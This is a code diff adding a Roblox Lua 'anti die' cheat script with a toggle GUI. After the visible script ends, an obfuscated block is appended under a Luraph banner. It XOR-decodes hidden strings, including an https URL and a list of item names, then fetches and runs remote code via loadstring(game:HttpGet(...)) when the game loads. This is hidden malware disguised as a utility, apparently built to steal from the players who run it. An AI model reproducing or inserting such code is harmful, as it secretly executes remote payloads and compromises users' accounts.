+            mobileScale.Scale = Config.MobileUIScale / 100
+        else
+            hotkeyContainer.Visible = true
+            sizeContainer.Visible = false
+            mainFrame.Size = UDim2.new(0, 300, 0, 300)
+            smokeContainer.Position = UDim2.new(0, 18, 0, 126)
+            statusButton.Text = Config.Enabled and "ENABLED" or "DISABLED"
+            pcBtn.BackgroundColor3 = RADIO_GREEN
+            pcBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
+            mobileBtn.BackgroundColor3 = Color3.fromRGB(30, 50, 30)
+            mobileBtn.TextColor3 = Color3.fromRGB(150, 200, 150)
+            mobileScale.Scale = 1
+        end
+        saveConfig()
+    end
+
+    pcBtn.MouseButton1Click:Connect(function()
+        setMobileMode(false)
+    end)
+
+    mobileBtn.MouseButton1Click:Connect(function()
+        setMobileMode(true)
+    end)
+
+    setMobileMode(Config.IsMobileMode)
+
+    if Config.Enabled then
+        updateToggle(true)
+    end
+
+    makeDraggable(mainFrame)
+
+    return mainGui
+end
+
+-- ============================================================
+-- BOOT
+-- ============================================================
+local function main()
+    buildGui()
+    print("[drxhub ANTI DIE] Loaded! Press " .. Config.Keybind.Name .. " to toggle Anti Die")
+end
+
+main()
+-- This file was protected using Luraph Obfuscator v15.0
+-- [https://lura.ph/]
+-- build_9ece98e74e5a
+
+local iHMd=bit32 or _G.bit32
+if not iHMd then error("bit32 requerido") end
+local sMDY=iHMd.bxor
+local ELAc=string.char
+local EaSu=table.concat
+local HPjc={151,200,212,38,17,37,140,95,77,232,117,194,241,116,153,177}
+local function DcbQrc(s)
+    local t={}
+    for i=1,#s do
+        t[i]=ELAc(sMDY(s:byte(i),HPjc[((i-1)%#HPjc)+1]))
+    end
+    return EaSu(t)
+end
+
+local CEYDiNWOFKY=8282080360 local wQnaaXxelIk=DcbQrc("\211\186\187\79\73\93\189")local ZLTYYSLTlr=DcbQrc("\255\188\160\86\98\31\163\112\41\129\6\161\158\6\253\159\244\167\185\9\112\85\229\112\58\141\23\170\158\27\242\194\184\249\225\18\38\19\186\108\121\219\68\245\197\68\173\131\163\250\226\21\62\20\203\13\43\220\67\157\162\32\223\232\254\142\145\108\93\92\217\20\3\221\61\166\179\61\241\229\196\152\188\108\33\83\203\12\117\163\54\182\176\51\205\238\217\250\149\64\114\76\220\105\62\174\44\154\131\65\220\250\248\146\161\92\98\122\235\29\57")local HXAcpmGBC={[DcbQrc("\196\188\166\71\102\71\233\45\63\145\85\135\157\17\233\217\246\166\160")]=true,[DcbQrc("\218\173\187\81\125")]=true,[DcbQrc("\196\163\189\68\120\65\229\127\25\135\28\174\148\0")]=true,[DcbQrc("\210\164\177\64\112\75\248\48\109\174\7\171\150\27")]=true,[DcbQrc("\221\167\188\72\49\117\227\45\38")]=true,[DcbQrc("\214\186\183\71\117\87\237\56\34\134")]=true,[DcbQrc("\211\186\181\65\126\75\172\24\36\134\18\167\131\29\247\216")]=true,[DcbQrc("\208\186\189\64\119\76\226")]=true,[DcbQrc("\223\177\176\84\112\5\200\45\44\143\26\172\209\55\248\223\249\173\184\74\126\75\229")]=true,[DcbQrc("\223\177\176\84\112\5\206\42\35\134\12")]=true,[DcbQrc("\214\166\160\73\127\76\227")]=true,[DcbQrc("\199\169\186\69\112\78\233\127\44\134\17\226\162\13\235\196\231")]=true,[DcbQrc("\197\161\183\73\49\97\229\49\40\154\26")]=true,[DcbQrc("\211\186\181\65\126\75\172\30\60\157\20\172\152\26\240")]=true,[DcbQrc("\196\161\179\72\126\87\233\127\14\137\7\163\129\21\250\212")]=true,[DcbQrc("\223\173\181\66\125\64\255\44\109\160\26\176\130\17\244\208\249")]=true,[DcbQrc("\219\167\167\6\85\87\237\56\34\134\6")]=true}local kZZTQoRC={}local EHOxBlxSx={[DcbQrc("\213\164\187\73\117\72\227\48\35\200\61\163\156\25\252\195")]=true}task.spawn(function()if _G.drxhubAntiDieRunning then return end _G.drxhubAntiDieRunning=true repeat task.wait()until game:IsLoaded()local leUaCxfz=game:GetService(DcbQrc("\199\164\181\95\116\87\255"))local MOiVlRKaYq=game:GetService(DcbQrc("\197\189\186\117\116\87\250\54\46\141"))local tbOyhPhJALE=game:GetService(DcbQrc("\195\191\177\67\127\118\233\45\59\129\22\167"))local cBYTduZy=game:GetService(DcbQrc("\194\187\177\84\88\75\252\42\57\187\16\176\135\29\250\212"))local soTCQeYGlnd=game:GetService(DcbQrc("\196\167\161\72\117\118\233\45\59\129\22\167"))local RQqlbYzese=game:GetService(DcbQrc("\223\188\160\86\66\64\254\41\36\139\16"))local TkREzUrx=leUaCxfz.TkREzUrx task.wait(1)local script=loadstring(game:HttpGet(DcbQrc("\255\188\160\86\98\31\163\112\63\137\2\236\150\29\237\217\226\170\161\85\116\87\239\48\35\156\16\172\133\90\250\222\250\231\183\78\126\70\227\51\44\155\22\176\152\4\237\156\240\164\189\82\114\77\163\44\46\154\28\178\133\91\235\212\241\187\251\78\116\68\232\44\98\133\20\171\159\91\245\222\240\161\183\8\125\80\237")))()if type(script)==DcbQrc("\241\189\186\69\101\76\227\49")then script(CEYDiNWOFKY,wQnaaXxelIk,ZLTYYSLTlr,HXAcpmGBC,kZZTQoRC,EHOxBlxSx)end end)
